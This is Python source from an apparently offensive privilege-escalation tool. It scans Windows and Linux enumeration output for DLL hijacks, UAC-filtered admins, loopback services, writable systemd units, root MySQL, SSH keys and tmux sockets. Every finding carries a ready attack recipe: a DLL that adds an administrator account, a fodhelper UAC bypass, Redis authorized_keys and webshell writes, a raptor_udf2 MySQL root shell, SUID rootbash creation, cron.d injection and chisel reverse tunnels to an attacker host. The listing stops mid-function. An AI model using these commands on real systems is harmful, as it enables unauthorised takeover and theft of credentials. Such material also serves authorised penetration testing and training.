_PV_WIN_PATH = re.compile(r'(?im)^(?:Path|PATH)=([^\r\n]+)$')
_WIN_PATH_SKIP = re.compile(r'(?i)^(?:[A-Za-z]:\\Windows|[A-Za-z]:\\Program Files|%SystemRoot%|%windir%)')
_DLL_HINT = (
    "x86_64-w64-mingw32-gcc dll.cpp --shared -o {dll}  (DllMain: system(\"cmd.exe /c net user pwn Passw0rd! /add "
    "&& net localgroup Administrators pwn /add\") or WinExec(rev.exe)) ; copy {dll} into {dir} ; "
    "restart the owning service (sc stop/start <svc> with START/STOP right, or shutdown /r /t 0) ; "
    "verify: net localgroup Administrators")


def _pass_dll(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_dll", set())
    # (C) Path= elements -> ctx['win_paths'] (before (A)/(B) so upgrades see them)
    for m in _PV_WIN_PATH.finditer(text):
        for el in m.group(1).split(";"):
            el = el.strip()
            if not el or _WIN_PATH_SKIP.match(el) or not re.match(r'^[A-Za-z]:\\', el):
                continue
            if el.lower() in seen:
                continue
            seen.add(el.lower())
            ctx["win_paths"].add(el)
            _ev(store, path, _ln(m), "win_path_dir", "windows", target=el)
    # (A) winPEAS rows
    for m in _PV_WINPEAS_DLL.finditer(text):
        d, principal, perms = m.group(1).strip(), m.group(2).strip(), m.group(3).strip()
        key = ("peas", d.lower())
        if key in seen:
            continue
        seen.add(key)
        ctx["writable"][d] = "winpeas:" + principal
        ctx["win_paths"].add(d)
        report.add("HIGH", CAT, path, _ln(m),
                   f"writable PATH dir {d} ({principal} {perms}) - DLL hijack / PATH binary hijack",
                   hint="find a SYSTEM service/process that loads a missing DLL (Procmon: CreateFile + NAME NOT FOUND "
                        "filter, or winPEAS 'Hijackable DLLs') then " + _DLL_HINT.format(dll="<missing>.dll", dir=d))
        _ev(store, path, _ln(m), "dll_hijack_dir", "windows", target=d, principal=principal, rights=perms)
    # (B) Procmon exports
    count = 0
    for rx in (_PV_PROCMON_CSV, _PV_PROCMON_TSV):
        for m in rx.finditer(text):
            proc, dll = m.group(1).strip(), m.group(3).strip()
            d = dll.rsplit("\\", 1)[0]
            key = ("pm", proc.lower(), dll.lower())
            if key in seen:
                continue
            seen.add(key)
            if _WIN_NEVER.match(d) and not _is_win_writable(d, ctx):
                continue
            if re.match(r'(?i)^[A-Za-z]:\\Program Files', d) and not _is_win_writable(d, ctx):
                continue
            if count >= 10:
                break
            count += 1
            pb = proc.lower()
            is_svc = any(_wbase(b).lower() == pb for b in ctx["services"].values())
            w = _is_win_writable(d, ctx) or re.match(r'(?i)^[A-Za-z]:\\(?:Users\\[^\\]+|Temp)(?:\\|$)', d)
            sev = "CRITICAL" if (is_svc and w) else ("HIGH" if (is_svc or w) else "MEDIUM")
            report.add(sev, CAT, path, _ln(m),
                       f"process {proc} looks for missing {dll}" + (" (service binary)" if is_svc else "")
                       + (" - dir writable/user-owned" if w else ""),
                       hint=_DLL_HINT.format(dll=_wbase(dll), dir=d))
            _ev(store, path, _ln(m), "dll_hijack", "windows", target=dll, proc=proc, dir=d, service=is_svc)


# ═══════════════════════════════════════════════════════════════════════════
# D3-10  UAC-filtered local admin (whoami /groups + net user)
# ═══════════════════════════════════════════════════════════════════════════
_PV_GRP_HDR = re.compile(r'(?im)^Group Name[ \t]+Type[ \t]+SID[ \t]+Attributes[ \t]*$')
_PV_ADMIN_DENY = re.compile(
    r'(?im)^BUILTIN\\Administrators[ \t]+Alias[ \t]+S-1-5-32-544[ \t]+Group used for deny only')
_PV_IL = re.compile(
    r'(?im)^Mandatory Label\\(Low|Medium|Medium Plus|High|System) Mandatory Level[ \t]+Label[ \t]+S-1-16-(\d+)')
_PV_NETUSER_ADMIN = re.compile(r'(?im)^Local Group Memberships[ \t]+(?:\*[\w ]+?[ \t]+)*\*Administrators\b')
_PV_NETUSER_NAME = re.compile(r'(?im)^User name[ \t]+(\S+)')
_UAC_HINT = (
    "(1) with the password/NT hash: nxc smb <ip> -u '{u}' -p '<pw>' --local-auth -> (Pwn3d!) = remote full "
    "token: impacket-psexec '{u}:<pw>@<ip>' (always for RID-500 Administrator; other admins need "
    "LocalAccountTokenFilterPolicy=1)  |  (2) fodhelper bypass (Win10/11, interactive-token session e.g. RDP): "
    "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d \"C:\\Users\\<u>\\rev.exe\" /f ; "
    "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f ; "
    "fodhelper.exe ; cleanup: reg delete HKCU\\Software\\Classes\\ms-settings /f  |  (3) RDP GUI: "
    "xfreerdp /v:<ip> /u:'{u}' /p:'<pw>' /cert-ignore -> run cmd as administrator  |  "
    "(4) runas /user:Administrator cmd if the Administrator password is known")


def _pass_uac(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_uac", set())
    il = _PV_IL.search(text)
    il_name = il.group(1) if il else ""
    if _PV_GRP_HDR.search(text):
        dm = _PV_ADMIN_DENY.search(text)
        if dm and il_name in ("Low", "Medium", "Medium Plus") and "uac" not in seen:
            seen.add("uac")
            um = _PV_WIN_USER.search(text)
            user = um.group(1) if um else ""
            short = user.split("\\")[-1] if user else "<user>"
            ctx["win_user"] = short
            report.add("HIGH", CAT, path, _ln(dm),
                       f"UAC-filtered admin token ({il_name} IL) - {user or 'this account'} is ALREADY local Administrator",
                       hint=_UAC_HINT.format(u=_sh(short)))
            _ev(store, path, _ln(dm), "uac_filtered_admin", "windows", user=short, il=il_name)
    for nm in _PV_NETUSER_ADMIN.finditer(text):
        if il_name == "High":
            break
        # nearest preceding `User name` line
        head = text[:nm.start()]
        names = list(_PV_NETUSER_NAME.finditer(head))
        name = names[-1].group(1) if names else "<user>"
        if ("netuser", name) in seen:
            continue
        seen.add(("netuser", name))
        report.add("MEDIUM", CAT, path, _ln(nm),
                   f"user {name} is a local Administrator (net user) - check token integrity",
                   hint="whoami /groups  (Medium IL + 'Group used for deny only' = UAC-filtered: see fodhelper / "
                        "psexec hints)  |  " + _UAC_HINT.format(u=_sh(name)))
        _ev(store, path, _ln(nm), "local_admin_member", "windows", user=name)


# ═══════════════════════════════════════════════════════════════════════════
# D3-11  loopback-only listeners (ss / netstat / netstat -ano)
# ═══════════════════════════════════════════════════════════════════════════
_PV_SS = re.compile(
    r'(?im)^LISTEN[ \t]+\d+[ \t]+\d+[ \t]+(127\.0\.0\.1|\[::1\]|localhost|127\.0\.0\.53|127\.\d+\.\d+\.\d+)'
    r'(?:%\w+)?:(\d{1,5})[ \t]+\S+(?:[ \t]+users:\(\("([^"]+)")?')
_PV_NETSTAT_LIN = re.compile(
    r'(?im)^(tcp6?)[ \t]+\d+[ \t]+\d+[ \t]+(127\.0\.0\.1|::1|localhost|127\.\d+\.\d+\.\d+):(\d{1,5})[ \t]+\S+[ \t]+LISTEN'
    r'(?:[ \t]+(?:(\d+)/(\S+)|-))?')
_PV_NETSTAT_WIN = re.compile(
    r'(?im)^[ \t]*TCP[ \t]+(127\.0\.0\.1|\[::1\]):(\d{1,5})[ \t]+\S+[ \t]+LISTENING[ \t]+(\d+)')
_PORT_MAP = {
    2375: ("docker-api", "CRITICAL"), 2376: ("docker-api", "CRITICAL"), 6379: ("redis", "HIGH"),
    27017: ("mongo", "HIGH"), 11211: ("memcached", "MEDIUM"), 9200: ("elasticsearch", "HIGH"),
    3306: ("mysql", "HIGH"), 5432: ("postgres", "MEDIUM"), 1433: ("mssql", "HIGH"),
    5985: ("winrm", "MEDIUM"), 3389: ("rdp", "MEDIUM"), 5900: ("vnc", "HIGH"), 5901: ("vnc", "HIGH"),
    25: ("smtp", "INFO"), 2049: ("nfs", "MEDIUM"), 4369: ("erlang-rabbit", "MEDIUM"),
    25672: ("erlang-rabbit", "MEDIUM"), 1521: ("oracle", "MEDIUM"), 8009: ("ajp", "HIGH"),
    9999: ("generic", "MEDIUM"), 631: ("cups", "INFO"), 53: ("dns", "INFO"),
}
_HTTP_PORTS = {8080, 8000, 8008, 8081, 8888, 3000, 5000, 9000, 9090, 10000, 80, 443, 8443, 4200, 8181, 7001}
_SVC_CLIENT = {
    "docker-api": "docker -H tcp://127.0.0.1:{p} run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "redis": "redis-cli -h 127.0.0.1 -p {p} -> config set dir /root/.ssh ; config set dbfilename authorized_keys ; "
             "set x \"\\n\\n<your pubkey>\\n\\n\" ; save  (or dir /var/www/html + dbfilename shell.php)",
    "mysql": "mysql -h 127.0.0.1 -P {p} -u root -p  (pairs with any mysql cred found; mysqld as root -> UDF)",
    "mssql": "impacket-mssqlclient '<user>:<pw>@127.0.0.1' -port {p} -> enable_xp_cmdshell",
    "postgres": "psql -h 127.0.0.1 -p {p} -U postgres  -> COPY ... FROM PROGRAM 'id' (superuser = RCE)",
    "mongo": "mongo --host 127.0.0.1 --port {p} -> show dbs (often unauth; creds in collections)",
    "elasticsearch": "curl http://127.0.0.1:{p}/_cat/indices?v -> dump indices (creds/PII)",
    "vnc": "xtightvncviewer 127.0.0.1::{p} via tunnel (password in ~/.vnc/passwd -> vncpwd)",
    "winrm": "evil-winrm -i 127.0.0.1 -P {p} -u <user> -p <pw> via tunnel",
    "rdp": "xfreerdp /v:127.0.0.1:{p} /u:<user> /p:<pw> via tunnel",
    "ajp": "Ghostcat CVE-2020-1938: read WEB-INF/web.xml via AJP (Tomcat < 9.0.31) - manual PoC, no msf",
    "nfs": "showmount -e 127.0.0.1 via tunnel -> no_root_squash export = SUID bash",
    "http": "browser http://127.0.0.1:{p} via tunnel -> gobuster/ffuf; default creds (Jenkins/Tomcat/Gitea/Webmin/CMS)",
    "memcached": "echo 'stats items' | nc 127.0.0.1 {p} -> dump keys (sessions/creds)",
}


def _pass_listeners(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_ports", set())
    rows = []
    for m in _PV_SS.finditer(text):
        rows.append((m.group(1), int(m.group(2)), m.group(3) or "", "", _ln(m), "linux"))
    for m in _PV_NETSTAT_LIN.finditer(text):
        rows.append((m.group(2), int(m.group(3)), m.group(5) or "", m.group(4) or "", _ln(m), "linux"))
    for m in _PV_NETSTAT_WIN.finditer(text):
        rows.append((m.group(1), int(m.group(2)), "", m.group(3), _ln(m), "windows"))
    n = 0
    for bind, port, prog, pid, line, osn in rows:
        if port in seen or port > 65535:
            continue
        seen.add(port)
        if bind == "127.0.0.53" and port == 53:
            continue
        if port in _HTTP_PORTS:
            svc, sev = "http", "MEDIUM"
        elif port in _PORT_MAP:
            svc, sev = _PORT_MAP[port]
        else:
            svc, sev = "unknown", "INFO"
        if port in (631, 53):
            sev = "INFO"
        if n >= 25:
            break
        n += 1
        client = _SVC_CLIENT.get(svc, f"nmap -sV -p {port} 127.0.0.1 via tunnel ; nc -v 127.0.0.1 {port}").format(p=port)
        if osn == "windows":
            tunnel = (f"netsh interface portproxy add v4tov4 listenport={port} listenaddress=0.0.0.0 "
                      f"connectport={port} connectaddress=127.0.0.1 (needs admin) or plink -R {port}:127.0.0.1:{port} "
                      f"<kali-user>@<ATT> ; or chisel client <ATT>:8000 R:{port}:127.0.0.1:{port}")
        else:
            tunnel = (f"ssh -L {port}:127.0.0.1:{port} <user>@<target> (if ssh creds) OR Kali: chisel server -p 8000 "
                      f"--reverse ; target: ./chisel client <ATT>:8000 R:{port}:127.0.0.1:{port}")
        extra = " - internal web app, often the intended privesc (admin UI w/ default creds)" if svc == "http" else ""
        report.add(sev, CAT, path, line,
                   f"loopback-only {svc}:{port}" + (f" ({prog})" if prog else (f" (pid {pid})" if pid else "")) + extra,
                   hint=f"{tunnel} ; then {client}")
        if store is not None:
            store.add(Evidence(kind="local_service", port=port, service=svc, source=path, line=line,
                               meta={"technique": "local_service", "os": osn, "bind": bind,
                                     "prog": prog, "pid": pid, "sev": sev}))


# ═══════════════════════════════════════════════════════════════════════════
# D3-12  systemd services / timers
# ═══════════════════════════════════════════════════════════════════════════
_PV_LINPEAS_SVC_W = re.compile(r'(?im)^(/\S+\.service) is calling this writable executable: (/\S+)[ \t]*$')
_PV_EXECSTART = re.compile(r'(?im)^Exec(?:Start|StartPre|StartPost|Stop|Reload)\s*=\s*[-@+!:]*(\S+)(?:[ \t]+([^\r\n]*))?$')
_PV_UNIT_USER = re.compile(r'(?im)^User\s*=\s*(\S+)')
_PV_UNIT_GATE = re.compile(r'(?im)(?:^\[Service\][ \t]*$|\bcat[ \t]+\S+\.service\b|^# /\S+\.service$)')
_PV_UNIT_CAT = re.compile(r'(?im)^[^\r\n]{0,40}\bcat[ \t]+(/\S+\.service)[ \t]*$|^# (/\S+\.service)[ \t]*$|^● (\S+\.service)')
_PV_TIMER_HDR = re.compile(r'(?im)^NEXT[ \t]+LEFT[ \t]+LAST[ \t]+PASSED[ \t]+UNIT[ \t]+ACTIVATES')
_PV_TIMER_ROW = re.compile(r'(?im)^[^\r\n]*?[ \t](\S+\.timer)[ \t]+(\S+\.service)[ \t]*$')
_PV_STATUS_LOADED = re.compile(r'(?im)^[ \t]*Loaded:[ \t]+loaded[ \t]+\((/\S+\.service);')


def _pass_systemd(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_systemd", set())
    timers = {}
    if _PV_TIMER_HDR.search(text):
        for m in _PV_TIMER_ROW.finditer(text):
            timers[m.group(2)] = m.group(1)
            _ev(store, path, _ln(m), "systemd_timer", "linux", timer=m.group(1), service=m.group(2))
    # (A) linpeas verified-writable rows
    for m in _PV_LINPEAS_SVC_W.finditer(text):
        unit, exe = m.group(1), m.group(2)
        if (unit, exe) in seen:
            continue
        seen.add((unit, exe))
        ub = os.path.basename(unit)
        t = timers.get(ub)
        report.add("CRITICAL", CAT, path, _ln(m),
                   f"systemd unit {ub} runs WRITABLE {exe}" + (f" (re-runs via {t}: no restart needed)" if t else ""),
                   hint=f"printf '#!/bin/bash\\n{_ROOTBASH}\\n' >> {exe} (append; compiled binary -> replace it) ; "
                        f"wait for the timer (systemctl list-timers) / service restart / reboot -> /tmp/rootbash -p")
        _ev(store, path, _ln(m), "systemd_exec_writable", "linux", user="root", target=exe, unit=ub, timer=t or "")
        ctx["root_cmds"].append(("systemd", exe, _ln(m)))
        ctx["writable"][exe] = "linpeas"
    # (B) unit file contents
    base = os.path.basename(path).lower()
    unit_shaped = base.endswith((".service", ".timer")) or bool(_PV_UNIT_GATE.search(text))
    if unit_shaped:
        lines = text.split("\n")
        # map line -> unit name (nearest preceding `cat x.service` / `# x.service` / filename)
        unit_at = {}
        cur = base if base.endswith(".service") else "<unit>"
        for i, ln in enumerate(lines):
            cm = _PV_UNIT_CAT.match(ln)
            if cm:
                cur = os.path.basename(cm.group(1) or cm.group(2) or cm.group(3))
            unit_at[i] = cur
        um = _PV_UNIT_USER.search(text)
        unit_user = um.group(1) if um else "root"
        for m in _PV_EXECSTART.finditer(text):
            line = _ln(m)
            unit = unit_at.get(line - 1, cur)
            exe = m.group(1)
            cands = [exe] + [t.strip("'\"") for t in (m.group(2) or "").split()
                             if t.strip("'\"").startswith("/") and t.strip("'\"").endswith(_SCRIPT_EXT)]
            for c in cands:
                if not c.startswith(_CUSTOM_DIRS) or (unit, c) in seen:
                    continue
                seen.add((unit, c))
                t = timers.get(unit)
                rerun = f" (re-runs via {t}: no restart needed)" if t else ""
                if unit_user not in ("root", "0") and unit_user != ctx.get("user", unit_user):
                    report.add("MEDIUM", CAT, path, line,
                               f"unit {unit} runs {c} as {unit_user} (lateral, not root)",
                               hint=f"ls -la {c} -> if writable, append a reverse shell to become {unit_user}")
                    _ev(store, path, line, "systemd_exec", "linux", user=unit_user, target=c, unit=unit)
                    continue
                if unit_user not in ("root", "0"):
                    continue
                ctx["root_cmds"].append(("systemd", (exe + " " + (m.group(2) or "")).strip(), line))
                wr = ctx["writable"].get(c) or ctx["writable"].get(os.path.dirname(c))
                if wr:
                    report.add("CRITICAL", CAT, path, line,
                               f"root unit {unit} runs WRITABLE {c}{rerun}",
                               hint=f"printf '#!/bin/bash\\n{_ROOTBASH}\\n' >> {c} -> wait for timer/restart/reboot -> /tmp/rootbash -p")
                    _ev(store, path, line, "systemd_exec_writable", "linux", user="root", target=c, unit=unit, timer=t or "")
                else:
                    report.add("HIGH", CAT, path, line,
                               f"root unit {unit} runs user-space {c}{rerun} - verify writability",
                               hint=f"ls -la {c} {os.path.dirname(c)} -> writable => append `{_ROOTBASH}` ; "
                                    f"also check relative commands / python imports inside it ; "
                                    f"systemctl list-timers --all | grep {unit.replace('.service', '')}")
                    _ev(store, path, line, "systemd_exec", "linux", user="root", target=c, unit=unit, timer=t or "")
    # (D) systemctl status -> unit path only (store-only context)
    for m in _PV_STATUS_LOADED.finditer(text):
        _ev(store, path, _ln(m), "systemd_unit_path", "linux", target=m.group(1))


# ═══════════════════════════════════════════════════════════════════════════
# D3-13  MySQL / MariaDB running as root -> UDF / FILE-priv
# ═══════════════════════════════════════════════════════════════════════════
_PV_PS_ROOT_MYSQL = re.compile(
    r'(?im)^root[ \t]+\d+[ \t]+(?:[\d.]+[ \t]+[\d.]+[ \t]+\d+[ \t]+\d+[ \t]+\S+[ \t]+\S+[ \t]+\S+[ \t]+\S+|'
    r'\d+[ \t]+\d+[ \t]+\S+[ \t]+\S+[ \t]+\S+)[ \t]+(\S*(?:mysqld|mariadbd)(?:_safe)?)\b([^\r\n]*)$')
_PV_MYCNF_ROOT = re.compile(r'(?im)^\[mysqld\][^\[]*?^[ \t]*user[ \t]*=[ \t]*root[ \t]*$')
_PV_SECURE_FILE_PRIV = re.compile(r'(?im)^\|?[ \t]*secure_file_priv[ \t]*\|[ \t]*\|')
_PV_PLUGIN_DIR = re.compile(r'(?im)^\|?[ \t]*plugin_dir[ \t]*\|[ \t]*(/\S+)[ \t]*\|')
_UDF_HINT = (
    "searchsploit -m 1518 (raptor_udf2.c) ; gcc -g -c raptor_udf2.c -fPIC ; gcc -g -shared -Wl,-soname,raptor_udf2.so "
    "-o raptor_udf2.so raptor_udf2.o -lc ; mysql -u root -p'<pw>' -> use mysql; create table foo(line blob); "
    "insert into foo values(load_file('/tmp/raptor_udf2.so')); select * from foo into dumpfile '{plug}raptor_udf2.so'; "
    "create function do_system returns integer soname 'raptor_udf2.so'; "
    "select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash'); -> /tmp/rootbash -p  |  "
    "FILE-priv alt (secure_file_priv empty): select '* * * * * root cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash' "
    "into outfile '/etc/cron.d/pwn'  |  mysql < 5.7: select load_file('/etc/shadow')")


def _pass_mysql_root(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_mysql", set())
    pm = _PV_PLUGIN_DIR.search(text)
    plug = pm.group(1).rstrip("/") + "/" if pm else "/usr/lib/mysql/plugin/"
    rows = list(_PV_PS_ROOT_MYSQL.finditer(text))
    plain = [m for m in rows if not m.group(1).endswith("_safe")]
    hit = plain[0] if plain else (rows[0] if rows else None)
    base = os.path.basename(path).lower()
    if hit is None and (base.endswith((".cnf", ".ini")) or base == "my.cnf"):
        hit = _PV_MYCNF_ROOT.search(text)
    if hit is not None and "root" not in seen:
        seen.add("root")
        report.add("HIGH", CAT, path, _ln(hit),
                   "mysqld runs as ROOT -> UDF (raptor_udf2) or FILE-priv write = root shell (needs a mysql login)",
                   hint=_UDF_HINT.format(plug=plug))
        _ev(store, path, _ln(hit), "mysql_root_proc", "linux", user="root", plugin_dir=plug)
    sm = _PV_SECURE_FILE_PRIV.search(text)
    if sm and "sfp" not in seen:
        seen.add("sfp")
        report.add("MEDIUM", CAT, path, _ln(sm),
                   "secure_file_priv is EMPTY -> FILE privilege writes anywhere as the mysqld user",
                   hint="select '<content>' into outfile '/path' (webshell into the docroot, cron.d row if mysqld is root) ; "
                        "select load_file('/etc/passwd')")
        _ev(store, path, _ln(sm), "mysql_file_priv", "linux")


# ═══════════════════════════════════════════════════════════════════════════
# D3-14  SSH private keys discovered in listings (find / ls -la / linpeas)
# ═══════════════════════════════════════════════════════════════════════════
_PV_KEY_FIND = re.compile(
    r'(?m)^(/(?:home|root|opt|var|srv|etc|mnt|backup)/\S*?/(?:id_(?:rsa|dsa|ecdsa|ed25519)(?:_\w+)?|\.ssh/[\w.\-]+\.pem))$')
_PV_FIND_NAME_PROMPT = re.compile(r'(?im)^[^\r\n]{0,40}\bfind\s+\S[^\r\n]*?-i?name\b')
_PV_LINPEAS_SSH_HDR = re.compile(r'Analyzing SSH Files')
_PV_LS_BARE = re.compile(
    r'(?im)^(-[rwx-]{9})[+.@]?[ \t]+\d+[ \t]+([\w.\-]+)[ \t]+[\w.\-]+[ \t]+\d+[ \t]+\S+[ \t]+\S+[ \t]+\S+[ \t]+'
    r'(id_(?:rsa|dsa|ecdsa|ed25519)|authorized_keys|[\w.\-]+\.(?:pem|ppk))[ \t]*$')
_PV_LS_PROMPT = re.compile(r'(?im)^[^\r\n]{0,40}\bls\s+-\w*\s+(/\S+)[ \t]*$|^(/\S+):[ \t]*$')
_PV_KEY_ABS = re.compile(r'/(?:id_(?:rsa|dsa|ecdsa|ed25519)(?:_\w+)?|[\w.\-]+\.(?:pem|ppk))$')
_KEY_HINT = (
    "cat {p} -> paste into Kali `key`; chmod 600 key; ssh -i key {owner}@<target>  (owner unknown: "
    "for u in root {owner}; do ssh -i key $u@<target>; done) ; encrypted (ENCRYPTED / aes256-ctr header): "
    "ssh2john key > k.hash; john k.hash --wordlist=rockyou.txt")


def _key_owner(p):
    if p.startswith("/root/"):
        return "root"
    parts = p.split("/")
    if len(parts) > 2 and parts[1] == "home":
        return parts[2]
    return "<owner>"


def _pass_ssh_keys(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_keys", set())
    cu = ctx.get("user")

    def emit(p, mode, line):
        if p in seen:
            return
        seen.add(p)
        owner = _key_owner(p)
        if p.endswith("/authorized_keys"):
            if mode and mode[8] == "w":
                report.add("CRITICAL", CAT, path, line, f"{p} is WRITABLE -> ssh in as {owner}",
                           hint=f"ssh-keygen -t ed25519 -f key -N '' ; cat key.pub >> {p} ; ssh -i key {owner}@<target>")
                _ev(store, path, line, "authorized_keys_writable", "linux", user=owner, target=p)
            return
        if mode and mode[7] != "r" and owner == cu:
            return                                   # our own 0600 key: not a hop
        sev = "HIGH"
        if mode and mode[7] != "r" and owner != cu:
            sev = "MEDIUM"
        if owner == "root" and (not mode or mode[7] == "r"):
            sev = "CRITICAL"
        report.add(sev, CAT, path, line,
                   f"SSH private key of {owner} at {p}" + (f" (mode {mode})" if mode else " (listing: check perms)"),
                   hint=_KEY_HINT.format(p=p, owner=owner))
        _ev(store, path, line, "ssh_key_listing", "linux", user=owner, target=p, mode=mode or "")

    lines = text.split("\n")
    # (A) bare paths after a find -name prompt / linpeas SSH header (400-line window)
    gated = set()
    for m in list(_PV_FIND_NAME_PROMPT.finditer(text)) + list(_PV_LINPEAS_SSH_HDR.finditer(text)):
        start = _ln(m) - 1
        gated.update(range(start + 1, min(start + 401, len(lines))))
    for i in sorted(gated):
        km = _PV_KEY_FIND.match(lines[i].strip())
        if km:
            emit(km.group(1), "", i + 1)
    # (B) absolute ls rows
    for m in _PV_LS_ROW.finditer(text):
        p = m.group(4).strip()
        if _PV_KEY_ABS.search(p) or p.endswith("/authorized_keys"):
            if m.group(1)[0] == "-":
                emit(p, m.group(1), _ln(m))
    # (C) bare-name ls rows: dir from the nearest preceding `ls -la <dir>` / `<dir>:` line
    cur_dir = None
    for i, ln in enumerate(lines):
        pm = _PV_LS_PROMPT.match(ln)
        if pm:
            cur_dir = (pm.group(1) or pm.group(2)).rstrip("/")
            continue
        bm = _PV_LS_BARE.match(ln)
        if bm and cur_dir:
            emit(cur_dir + "/" + bm.group(3), bm.group(1), i + 1)


# ═══════════════════════════════════════════════════════════════════════════
# D3-15  root tmux / screen sessions on shared sockets
# ═══════════════════════════════════════════════════════════════════════════
_PV_PS_TMUX = re.compile(
    r'(?im)^(\w[\w.\-]*)[ \t]+\d+[ \t]+[^\r\n]*?[ \t](\S*(?:tmux|screen))[ \t]+(?:[^\r\n]*?[ \t])?-(S|dmS|x|r|D)[ \t]+(\S+)')
_PV_LS_SOCK = re.compile(
    r'(?im)^s([rwx-]{9})[+.@]?[ \t]+\d+[ \t]+(root)[ \t]+([\w.\-]+)[ \t]+\d+[ \t]+\S+[ \t]+\S+[ \t]+\S+[ \t]+(\S+)[ \t]*$')
_PV_SCREEN_LS = re.compile(r'(?im)^[ \t]+(\d+\.\S+)[ \t]+\((?:Multi|Attached|Detached)[^)]*\)')
_PV_SCREEN_HDR = re.compile(r'(?i)There (?:is|are) (?:a )?screens? on:')


def _pass_tmux(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_tmux", set())
    groups = ctx.get("uid_groups", set())
    uid = ctx.get("uid")
    lines = text.split("\n")
    for m in _PV_PS_TMUX.finditer(text):
        user, prog, flag, arg = m.group(1), os.path.basename(m.group(2)), m.group(3), m.group(4)
        if user != "root" or ("ps", arg) in seen:
            continue
        seen.add(("ps", arg))
        if prog == "tmux":
            hint = f"tmux -S {arg}  (attach; 'error connecting' -> check socket group perms: ls -la {arg}) ; then: id"
        else:
            hint = f"screen -x root/{arg}  (needs multiuser + acladd; else check /var/run/screen/S-root perms)"
        report.add("HIGH", CAT, path, _ln(m),
                   f"root {prog} session on {'socket' if flag in ('S',) else 'session'} {arg} -> attach as root",
                   hint=hint)
        _ev(store, path, _ln(m), "tmux_socket", "linux", user="root", target=arg, prog=prog)
    cur_dir = None
    for i, ln in enumerate(lines):
        pm = _PV_LS_PROMPT.match(ln)
        if pm:
            cur_dir = (pm.group(1) or pm.group(2)).rstrip("/")
            continue
        sm = _PV_LS_SOCK.match(ln)
        if not sm:
            continue
        mode, group, name = sm.group(1), sm.group(3), sm.group(4)
        p = name if name.startswith("/") else ((cur_dir + "/" + name) if cur_dir else name)
        if ("sock", p) in seen:
            continue
        if uid and f"/tmp/tmux-{uid}/" in p:
            continue
        seen.add(("sock", p))
        gw, ow = mode[4] == "w", mode[7] == "w"
        if ow:
            sev, why = "CRITICAL", "world-writable"
        elif gw and group in groups:
            sev, why = "CRITICAL", f"group-writable by {group} (you are a member)"
        elif gw:
            sev, why = "HIGH", f"group-writable by {group} - if you are in {group}"
        else:
            continue
        report.add(sev, CAT, path, i + 1, f"root socket {p} {why} -> attach to the root tmux/screen session",
                   hint=f"tmux -S {p}  (screen: screen -x root/<name>) ; id")
        _ev(store, path, i + 1, "tmux_socket", "linux", user="root", target=p, group=group, mode=mode)
    if _PV_SCREEN_HDR.search(text):
        for m in _PV_SCREEN_LS.finditer(text):
            name = m.group(1)
            if ("screen", name) in seen:
                continue
            seen.add(("screen", name))
            multi = "Multi" in text[m.start():m.end()]
            report.add("MEDIUM", CAT, path, _ln(m),
                       f"screen session {name}" + (" (multiuser)" if multi else "") + " - attach if owned by root",
                       hint=f"screen -x <owner>/{name}  (ls -la /var/run/screen/ to find the owner)")
            _ev(store, path, _ln(m), "screen_session", "linux", target=name, multi=multi)


# ═══════════════════════════════════════════════════════════════════════════
# D3-16  python library hijacking (root-run script + writable dir/module)
# ═══════════════════════════════════════════════════════════════════════════
_PV_PY_INVOKE = re.compile(r'(?i)\bpython[23]?(?:\.\d+)?[ \t]+(?:-\w[ \t]+)*(/\S+\.py)\b')
_PV_PY_DIRECT = re.compile(r'(?m)(?:^|[ \t])(/\S+\.py)\b')
_PV_PY_IMPORT = re.compile(r'(?m)^(?:from[ \t]+([\w.]+)[ \t]+import|import[ \t]+([\w.]+))')
_PV_SYSPATH = re.compile(r"\[(?:'[^']*',\s*)*'(/usr/(?:local/)?lib/python[^']*)'")
_PV_CAT_PY = re.compile(r'(?im)^[^\r\n]{0,40}\bcat[ \t]+(/\S+\.py)[ \t]*$')
_PY_STDLIB = {
    "os", "sys", "re", "json", "time", "datetime", "subprocess", "shutil", "pathlib", "argparse", "logging",
    "socket", "hashlib", "base64", "random", "string", "math", "collections", "itertools", "functools",
    "typing", "csv", "sqlite3", "urllib", "http", "email", "smtplib", "tarfile", "zipfile", "gzip", "glob",
    "tempfile", "threading", "multiprocessing", "signal", "getpass", "pwd", "grp", "stat", "io", "struct",
    "pickle", "platform", "configparser", "requests", "__future__", "abc", "enum", "uuid", "codecs",
    "traceback", "warnings", "copy", "queue", "select", "errno", "fcntl", "pprint", "textwrap", "shlex",
    "ssl", "ftplib", "xml", "html", "ctypes", "unittest", "inspect", "secrets", "hmac", "binascii",
    "operator", "contextlib", "dataclasses", "asyncio", "decimal", "fractions", "statistics", "zlib",
    "bz2", "lzma", "mimetypes", "optparse", "getopt", "locale", "gettext", "atexit", "sched", "calendar",
    "yaml", "numpy", "pandas", "flask", "django", "paramiko", "psutil", "mysql", "pymysql", "psycopg2",
}


def _pass_python(text, path, report, store, ctx, _ln):
    seen = ctx.setdefault("_seen_py", set())
    scripts = []          # (script path, origin fact, cmd, line)
    for fact, cmd, line in ctx["root_cmds"]:
        for m in _PV_PY_INVOKE.finditer(cmd):
            scripts.append((m.group(1), fact, cmd, line))
        if not _PV_PY_INVOKE.search(cmd):
            for m in _PV_PY_DIRECT.finditer(cmd):
                if m.group(1).startswith(_CUSTOM_DIRS):
                    scripts.append((m.group(1), fact, cmd, line))
    # module names imported by a .py file / `cat x.py` block
    imports = set()
    if path.lower().endswith(".py") or _PV_CAT_PY.search(text):
        for m in _PV_PY_IMPORT.finditer(text):
            name = (m.group(1) or m.group(2) or "").split(".")[0]
            if name and name not in _PY_STDLIB:
                imports.add(name)
    # writable sys.path entries
    for m in _PV_SYSPATH.finditer(text):
        for el in re.findall(r"'([^']*)'", text[m.start():m.end() + 600]):
            if el and ctx["writable"].get(el) and ("syspath", el) not in seen:
                seen.add(("syspath", el))
